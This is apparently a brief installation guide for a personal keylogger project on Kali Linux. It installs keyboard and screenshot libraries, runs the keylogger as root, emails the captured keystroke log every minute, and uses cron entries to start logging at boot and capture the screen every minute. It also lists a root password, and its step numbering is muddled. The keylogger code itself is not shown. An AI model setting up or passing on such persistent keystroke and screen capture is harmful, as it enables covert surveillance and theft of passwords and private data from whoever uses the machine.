Installation Guide

1. Install lib keyboard
	'sudo pip3 install keyboard'
2. Run the python script with sudo
	'sudo ./keylogger_project'
3. The log should be emailed every minute
4. Install pyautogui
	'sudo pip3 install pyautogui'
5. Install 'scrot' for Linux to be able to take screenshots
	'sudo apt-get scrot'
4. Switch user to root
	pass 'kali'
5. Make a crontab entry to run script at boot
	'crontab -e'
	choose vim
	Edit crontab
		'@reboot /home/kali/python/keylogger_project/keylogger_project.py'
6. Make a crontab entry to run screenlogger every minute
	'crontab -e'
	choose vim
	Edit crontab
		'* * * * * /home/kali/python/keylogger_project/screenshot.py'
